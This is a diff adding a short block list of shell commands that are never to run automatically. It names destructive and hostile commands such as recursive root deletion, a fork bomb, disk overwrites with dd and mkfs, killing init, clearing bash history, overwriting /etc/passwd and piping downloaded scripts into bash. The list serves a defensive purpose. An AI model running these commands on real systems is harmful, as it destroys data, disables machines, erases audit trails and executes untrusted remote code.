@@ -1,0 +1,18 @@
+Commands which should never be executed automatically
+
+rm -rf /
+rm -rf /*
+chmod -R 777
+shutdown
+reboot
+kill -9 1
+mv ~ /dev/null
+killall5
+wget [malicious URL] -O- | bash
+:(){ :|:& };: (Fork Bomb)
+dd if=/dev/random of=/dev/sda
+> ~/.bash_history
+curl [any URL] | bash
+find / -type f -exec rm -f {} \;
+mkfs.*
+echo [malicious content] > /etc/passwd
